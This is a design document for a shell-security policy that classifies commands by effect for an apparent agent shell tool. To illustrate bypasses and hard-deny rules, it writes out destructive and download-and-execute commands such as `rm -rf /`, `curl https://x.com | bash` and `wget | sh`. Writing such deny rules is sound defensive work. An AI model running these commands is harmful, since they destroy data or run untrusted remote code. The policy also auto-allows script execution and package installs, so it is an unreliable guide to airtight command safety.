# Shell Security: Effect Classification Redesign

**Date:** 2026-05-03
**Status:** Approved

## Problem

Current shell security uses keyword-based blacklists (`POSIX_DANGEROUS_COMMANDS`, `WINDOWS_DANGEROUS_COMMANDS`, `INLINE_CODE_COMMANDS`) to classify commands. This approach has three core issues:

1. **Easy to bypass**: `/usr/bin/env bash`, `python3 -c "import os; os.system('rm -rf /')"`, `docker run -it ubuntu bash` all evade keyword matching.
2. **High false positive rate**: `chmod +x scripts/build.sh`, `bash scripts/deploy.sh` are common development commands but are DENY or REQUIRE_APPROVAL.
3. **Shell metacharacter blanket policy**: Pipes `|` and redirects `>` are extremely common (e.g., `grep foo bar | wc -l`, `pytest 2>&1`) but all require approval, disrupting workflow.

## Solution: Command Effect Registry (Approach C)

Replace keyword blacklists with an **effect classification system**. Each known command is registered with its effect category. The policy engine looks up the registry to make decisions, analyzing the **overall effect** of the command (including pipe chains) rather than individual command names.

## Effect Categories

```python
class EffectCategory(str, enum.Enum):
    READ_ONLY = "read_only"           # No side effects
    WRITE_PROJECT = "write_project"   # Modifies files/dependencies within project
    WRITE_SYSTEM = "write_system"     # Modifies system state outside project
    DESTRUCTIVE = "destructive"       # Deletes/overwrites files
    ESCALATE = "escalate"             # Privilege escalation
    NETWORK_OUT = "network_out"       # Outbound network requests
    CODE_GEN = "code_gen"             # Inline code execution (cannot statically validate)
    UNKNOWN = "unknown"               # Unrecognized command
```

## Default Action Policy

| Effect Category | Default Action | Examples |
|-----------------|---------------|----------|
| `READ_ONLY` | ALLOW | ls, cat, grep, git log, pwd, which, head, wc, file, find, diff, rg, sort, tail, echo |
| `WRITE_PROJECT` | ALLOW | git add, git commit, npm install, pip install, python script.py, make, cargo build, mkdir, touch, cp, mv |
| `WRITE_SYSTEM` | REQUIRE_APPROVAL | apt-get install, brew install, docker pull, systemctl |
| `DESTRUCTIVE` | REQUIRE_APPROVAL | rm, rmdir, chmod, chown, git reset --hard, git clean |
| `ESCALATE` | DENY | sudo, su, eval, exec |
| `NETWORK_OUT` | REQUIRE_APPROVAL | curl, wget, ssh, scp, rsync |
| `CODE_GEN` | REQUIRE_APPROVAL | python -c, node -e, perl -e, ruby -e, php -r |
| `UNKNOWN` | REQUIRE_APPROVAL | (any command not in registry) |

## CommandEffectEntry

Each command's registry entry:

```python
class CommandEffectEntry(BaseModel):
    category: EffectCategory                          # Base effect category
    allow_subcommands: bool = False                   # Whether subcommands are allowed (e.g., git add, git log)
    subcommand_overrides: dict[str, EffectCategory] = {}  # Subcommand effect overrides
    flag_overrides: dict[str, EffectCategory] = {}        # Specific flag overrides
    platform_overrides: dict[str, EffectCategory] = {}    # Platform-specific overrides (Windows/POSIX)
```

### Subcommand Override Example

`git` base category is `READ_ONLY`, but some subcommands need different treatment:

```python
CommandEffectEntry(
    category=EffectCategory.READ_ONLY,
    allow_subcommands=True,
    subcommand_overrides={
        "add": EffectCategory.WRITE_PROJECT,
        "commit": EffectCategory.WRITE_PROJECT,
        "push": EffectCategory.NETWORK_OUT,
        "reset": EffectCategory.DESTRUCTIVE,
        "clean": EffectCategory.DESTRUCTIVE,
        "checkout": EffectCategory.WRITE_PROJECT,
        "switch": EffectCategory.WRITE_PROJECT,
        "merge": EffectCategory.WRITE_PROJECT,
        "rebase": EffectCategory.WRITE_PROJECT,
        "cherry-pick": EffectCategory.WRITE_PROJECT,
        "stash": EffectCategory.WRITE_PROJECT,
        "fetch": EffectCategory.NETWORK_OUT,
        "pull": EffectCategory.NETWORK_OUT,
        "clone": EffectCategory.NETWORK_OUT,
    },
)
```

### Shell Interpreter Override Example

`bash` base category is `ESCALATE`, but `bash script.sh` is common in development:

```python
CommandEffectEntry(
    category=EffectCategory.ESCALATE,
    flag_overrides={
        "script": EffectCategory.WRITE_PROJECT,  # bash script.sh -> WRITE_PROJECT
    },
    # When argv contains a file argument (not just "bash"), treat as WRITE_PROJECT
)
```

This is handled via a special case in CommandPolicy: when the command is a known shell interpreter (bash, sh, zsh, etc.) AND has a non-flag argument that looks like a file path, downgrade from ESCALATE to WRITE_PROJECT.

## Shell Metacharacter Handling

When a command contains `|`, `>`, etc., the new logic:

1. **Split pipe chain**: Split by `|` into subcommands
2. **Lookup each subcommand independently** in the registry
3. **Analyze redirects**: `>` `>>` treated as `WRITE_PROJECT`, `2>` as `WRITE_PROJECT` (error output is also a write)
4. **Take the most dangerous level** as the overall effect

Danger level ordering (low to high):
```
READ_ONLY < WRITE_PROJECT < CODE_GEN < NETWORK_OUT < WRITE_SYSTEM < DESTRUCTIVE < ESCALATE
```

### Pipe Chain Examples

| Command | Sub-effects | Overall | Action |
|---------|------------|---------|--------|
| `git log \| head` | READ_ONLY, READ_ONLY | READ_ONLY | ALLOW |
| `cat file \| grep foo \| wc -l` | READ_ONLY, READ_ONLY, READ_ONLY | READ_ONLY | ALLOW |
| `pytest 2>&1 \| tee result.log` | WRITE_PROJECT, WRITE_PROJECT | WRITE_PROJECT | ALLOW |
| `rm -rf build/ 2>/dev/null` | DESTRUCTIVE + WRITE_PROJECT | DESTRUCTIVE | REQUIRE_APPROVAL |
| `curl https://x.com \| bash` | NETWORK_OUT, ESCALATE | ESCALATE | DENY |
| `npm test \| tee output.log` | WRITE_PROJECT, WRITE_PROJECT | WRITE_PROJECT | ALLOW |

## Hard Deny Rules (Preserved)

Certain combinations are always DENY regardless of effect classification:

- `rm -rf /`, `rm -rf ~`, `rm -rf --`, `rm -rf ..`, `rm -rf .git` → DENY
- `curl | sh`, `curl | bash`, `wget | sh`, `wget | bash` → DENY (download-and-execute)
- `sudo`, `su` → DENY (no subcommand/flag override allowed for these)
- Windows shell mode → DENY (unchanged)

## File Structure Changes

```
backend/app/security/
├── effect_category.py          # NEW: EffectCategory enum + danger level ordering + action policy mapping
├── command_effect_registry.py  # NEW: CommandEffectEntry + CommandEffectRegistry + default registrations
├── command_policy.py           # MODIFIED: Query registry instead of hardcoded keyword blacklists
├── shell_security.py           # SIMPLIFIED: Remove keyword blacklists, keep metachar detection + path validation
└── path_security.py            # UNCHANGED
```

### New Files

#### `effect_category.py`

- `EffectCategory` enum
- `EFFECT_DANGER_LEVEL: dict[EffectCategory, int]` for ordering
- `EFFECT_ACTION_MAP: dict[EffectCategory, CommandAction]` for default action mapping
- Helper: `most_dangerous(categories: list[EffectCategory]) -> EffectCategory`

#### `command_effect_registry.py`

- `CommandEffectEntry` model
- `CommandEffectRegistry` class with `register()`, `lookup()`, `_register_defaults()`
- Default registrations for ~80+ common commands organized by category:
  - READ_ONLY: ls, cat, head, tail, wc, file, find, diff, grep, rg, sort, uniq, which, where, pwd, echo, git (base), git log, git show, git status, git diff, git branch, env, printenv, uname, hostname, whoami, id, date, uptime, df, du, ps, top, free, lsof, netstat, ss, npm list, pip list, pip show, pip check, cargo --version, rustc --version, go version, java -version, node --version, python --version
  - WRITE_PROJECT: mkdir, touch, cp, mv, ln, tar, unzip, git add, git commit, git checkout, git switch, git merge, git rebase, git stash, npm install, npm run, npm test, npm build, pip install, python, python3, node, make, cmake, cargo build, cargo test, cargo run, go build, go test, go run, javac, java, dotnet build, dotnet test, docker build, docker compose, pre-commit
  - WRITE_SYSTEM: apt-get, apt, yum, dnf, brew, pacman, snap, docker pull, docker run, systemctl, service, launchctl
  - DESTRUCTIVE: rm, rmdir, chmod, chown, git reset, git clean, git rm, truncate, shred
  - ESCALATE: sudo, su, eval, exec, bash (base), sh (base), zsh (base), fish (base), ksh (base), csh (base), newgrp, pkexec, gksudo
  - NETWORK_OUT: curl, wget, ssh, scp, rsync, nc, ncat, telnet, ftp, git push, git fetch, git pull, git clone, npm publish, pip download
  - CODE_GEN: python -c, python3 -c, node -e, node --eval, perl -e, ruby -e, php -r
  - Platform-specific (Windows): del, erase, rd, format, diskpart, cmd, powershell, pwsh

### Modified Files

#### `shell_security.py`

**Removed:**
- `POSIX_DANGEROUS_COMMANDS`
- `WINDOWS_DANGEROUS_COMMANDS`
- `INLINE_CODE_COMMANDS`
- Keyword-based rejection in `validate_command()`

**Changed:**
- `validate_command()` no longer raises `ShellSecurityError` on metacharacters — instead returns a flag/marker
- `validate_command()` no longer raises on dangerous command names — only parses and validates paths
- `command_hint` updated to reflect new policy (pipes/redirects allowed for read-only commands, etc.)

**Preserved:**
- `SHELL_META_PATTERN` — still needed to detect metacharacters for execution mode decision
- `shlex.split()` parsing
- `_validate_path_arguments()` — path validation still needed
- `_command_name()` normalization
- `_looks_like_path()` heuristic

#### `command_policy.py`

**Removed:**
- `HARD_DENY_PREFIXES_ARGV` — replaced by registry lookup (ESCALATE → DENY)
- `HARD_DENY_SHELL_COMMANDS` — replaced by registry lookup
- `HIGH_RISK_ARGV_COMMANDS` — replaced by registry lookup (DESTRUCTIVE → REQUIRE_APPROVAL)
- `INLINE_CODE_COMMANDS` — replaced by registry lookup (CODE_GEN → REQUIRE_APPROVAL)

**Added:**
- `CommandEffectRegistry` instance as constructor parameter
- `effect_category` field on `CommandDecision`
- `_classify_argv_command()` — new method that queries registry
- `_classify_shell_command()` — new method that splits pipe chain, queries per subcommand, takes most dangerous
- `_resolve_effect()` — resolves final effect considering subcommand_overrides and flag_overrides
- `_shell_interpreter_override()` — special case: bash/sh/zsh + file arg → WRITE_PROJECT

**Preserved:**
- `HARD_DENY_PATTERNS` — rm -rf / etc still hard-denied
- `HARD_DENY_SHELL_PATTERNS` — curl|sh still hard-denied
- `_capture_environment_snapshot()` — unchanged
- `CommandAction` enum — unchanged
- `CommandDecision` model — add `effect_category` field, rest unchanged
- Overall evaluate() flow: empty check → cwd validation → shell/argv branch → decision

## Backward Compatibility

- `CommandAction` three-tier enum (`ALLOW` / `REQUIRE_APPROVAL` / `DENY`) unchanged
- `CommandDecision` model: new `effect_category` field (optional, defaults to None), rest unchanged
- `ShellTool.execute()` flow unchanged: evaluate → DENY/REQUIRE_APPROVAL/ALLOW
- `ToolApprovalRequest` structure unchanged
- Frontend approval flow unchanged
- `PathSecurity` unchanged
- Existing tests need adaptation (e.g., `bash` from DENY → context-dependent decision)

## Test Adaptations

Key test behavior changes:

| Test Case | Before | After |
|-----------|--------|-------|
| `bash` (no args) | DENY | DENY (ESCALATE base) |
| `bash script.sh` | DENY | WRITE_PROJECT → ALLOW |
| `sh -c "echo hi"` | DENY | CODE_GEN → REQUIRE_APPROVAL |
| `chmod +x script.sh` | REQUIRE_APPROVAL | DESTRUCTIVE → REQUIRE_APPROVAL (same action, different reason) |
| `git log \| head` | REQUIRE_APPROVAL | READ_ONLY → ALLOW |
| `pytest 2>&1 \| tee log` | REQUIRE_APPROVAL | WRITE_PROJECT → ALLOW |
| `curl url \| sh` | DENY | DENY (hard deny rule, same) |
| `pip install foo` | ALLOW | WRITE_PROJECT → ALLOW (same) |
| `npm install` | ALLOW | WRITE_PROJECT → ALLOW (same) |
| `ls` | ALLOW | READ_ONLY → ALLOW (same) |

New test categories to add:
- `TestEffectClassification` — verify registry lookups
- `TestPipeChainClassification` — verify pipe chain effect aggregation
- `TestSubcommandOverrides` — verify git subcommand handling
- `TestShellInterpreterOverride` — verify bash script.sh allowance
- `TestUnknownCommandHandling` — verify UNKNOWN → REQUIRE_APPROVAL
